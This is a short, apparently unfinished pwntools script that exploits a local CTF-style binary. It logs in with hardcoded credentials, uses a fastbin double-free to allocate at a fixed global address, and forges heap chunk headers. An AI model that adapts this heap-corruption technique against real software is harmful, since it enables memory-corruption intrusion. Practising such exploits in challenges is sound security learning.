from pwn import *

context.log_level = 'debug'

sh=process('./pwn')
elf = ELF('./pwn')


def add(bname,dsize,des):
	sh.sendlineafter('>\n','1')
	sh.sendlineafter('name:',bname)
	sh.sendlineafter('size:',str(dsize))
        sh.sendlineafter('tion:',des)
	

def dele(idx):
	sh.sendlineafter('>\n','2')
	sh.sendlineafter('index:',str(idx))

sh.sendlineafter('username:','admin')
sh.sendlineafter('password:','frame')


add('a',0x60,'1111')
add('b',0x60,'2222')
add('c',24,'3333')


dele(0)
dele(1)
dele(0)

add('a',0x60,p64(0x60203d))
add('b',0x60,'4444')
add('c',0x60,'cccc')

add('e',0x60,'aaa'+p64(0x602060)+p64(0x51)+p64(0x602040)+p64(0)*8+p64(0x21))

#----------------------------------------------
add('1',0x90,p64(0)+p64(0x91)+p64(0)*10)
add('n',0x20,'check')
dele(1)

add('2',0x20,'')



#add('2',0x20,'2'*0x19)

#dele(0)


#dele(0)
#add('2',0x20,'\x10\x10')
gdb.attach(sh)

sh.interactive()

